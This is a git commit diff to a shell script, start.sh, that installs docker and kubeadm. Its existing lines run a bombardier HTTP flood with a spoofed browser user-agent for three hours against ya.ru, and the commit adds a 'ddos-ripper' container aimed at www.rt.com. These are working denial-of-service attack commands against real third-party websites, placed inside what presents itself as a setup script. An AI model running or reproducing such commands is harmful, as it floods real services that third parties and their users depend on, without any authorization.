97163b11f8ac3d793143b135ad740a82ea9d63f7
dCrowb <34307264+dCrowb@users.noreply.github.com>
2022-03-01 19:46:16 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -16,3 +16,4 @@ sudo yum install -y docker >> ~/docker.log
 ###Installing kubernetes
 sudo yum install -y kubeadm >> ~/kubeadm.log
 docker run -ti --rm alpine/bombardier -c 1000 -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109" -d 10800s --rate 500 https://ya.ru --http2
+docker run --rm -it nitupkcuf/ddos-ripper:latest www.rt.com
